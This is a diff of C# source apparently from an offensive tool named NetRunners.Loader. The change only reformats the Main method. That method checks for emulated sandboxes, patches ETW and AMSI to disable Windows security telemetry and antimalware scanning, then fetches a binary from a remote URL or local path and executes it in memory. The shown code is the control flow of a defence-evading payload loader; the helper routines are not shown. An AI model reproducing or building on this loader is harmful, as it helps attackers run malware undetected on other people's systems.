@@ -33,40 +33,41 @@ namespace NetRunners.Loader
         static void Main(string[] args)
         {
             // Parse the command line arguments
-            Parser.Default.ParseArguments<Options>(args).WithParsed<Options>(o =>
-            {
-                Console.WriteLine($"Path: {o.path}");
-
-                if (!string.IsNullOrEmpty(o.binaryArguments))
+            Parser.Default.ParseArguments<Options>(args)
+                .WithParsed<Options>(o =>
                 {
-                    Console.WriteLine($"Binary Arguments: {o.binaryArguments}");
-                }
+                    Console.WriteLine($"Path: {o.path}");
 
-                if (!NonEmulatedApiHeuristic.Check() || !EtwPatcher.Patch() || !AmsiPatcher.Patch())
-                {
-                    return; // Exit if any checks fail or patching fails
-                }
+                    if (!string.IsNullOrEmpty(o.binaryArguments))
+                    {
+                        Console.WriteLine($"Binary Arguments: {o.binaryArguments}");
+                    }
 
-                // get binary
-                byte[] binaryData = (o.path).StartsWith("http", StringComparison.OrdinalIgnoreCase)
-                    ? binaryData = DownloadBinary(o.path)
-                    : binaryData = ReadFile(o.path);
+                    if (!NonEmulatedApiHeuristic.Check() || !EtwPatcher.Patch() || !AmsiPatcher.Patch())
+                    {
+                        return; // Exit if any checks fail or patching fails
+                    }
 
-                if (binaryData != null)
+                    // get binary
+                    byte[] binaryData = (o.path).StartsWith("http", StringComparison.OrdinalIgnoreCase)
+                        ? binaryData = DownloadBinary(o.path)
+                        : binaryData = ReadFile(o.path);
+
+                    if (binaryData != null)
+                    {
+                        // Load and execute the binary
+                        ExecuteBinaryInMemory(binaryData, o.binaryArguments);
+                    }
+                    else
+                    {
+                        Console.WriteLine("[-] File could not be retrieved.");
+                    }
+                })
+                .WithNotParsed<Options>(errs =>
                 {
-                    // Load and execute the binary
-                    ExecuteBinaryInMemory(binaryData, o.binaryArguments);
-                }
-                else
-                {
-                    Console.WriteLine("[-] File could not be retrieved.");
-                }
-            })
-            .WithNotParsed<Options>(errs =>
-            {
-                // display errors / invalid arguments
-                Console.WriteLine("Invalid arguments.");
-            });
+                    // display errors / invalid arguments
+                    Console.WriteLine("Invalid arguments.");
+                });
         }
     }
 
